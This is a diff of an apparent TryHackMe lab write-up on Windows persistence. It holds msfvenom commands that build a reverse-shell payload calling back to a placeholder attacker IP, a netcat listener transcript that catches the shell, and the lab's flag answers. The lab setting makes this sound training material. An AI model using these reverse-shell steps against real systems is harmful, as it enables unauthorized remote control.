@@ -194,7 +194,6 @@ THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}
 
 **TASK COMPLETED!**
 
-
 # Winlogon
 1. Started up this task's machine
 2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK MACHINE IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <PAYLOAD NAME>.exe` from our Linux attack machine
@@ -292,6 +291,9 @@ C:\flags\flag12.exe
 THM{I_INSIST_GO_FIRST}
 ```
 
+
+**TASK COMPLETED**
+
 # Logon Scripts
 1. Started up this task's machine
 2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK MACHINE IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <PAYLOAD NAME>.exe` from our Linux attack machine
@@ -374,8 +376,21 @@ C:\Users\Administrator>regedit
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Reconnected.png)
 
 ```Bash
+root@ip-10-10-157-221:~# nc -lvnp 9999
+Listening on [0.0.0.0] (family 0, port 9999)
+Connection from 10.10.236.33 49969 received!
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
 ```
 
 11. `C:\flags\flag13.exe`
 ```PowerShell
+C:\Windows\system32>C:\flags\flag13.exe
+C:\flags\flag13.exe
+THM{USER_TRIGGERED_PERSISTENCE_FTW}
 ```
+
+
+**TASK COMPLETED**
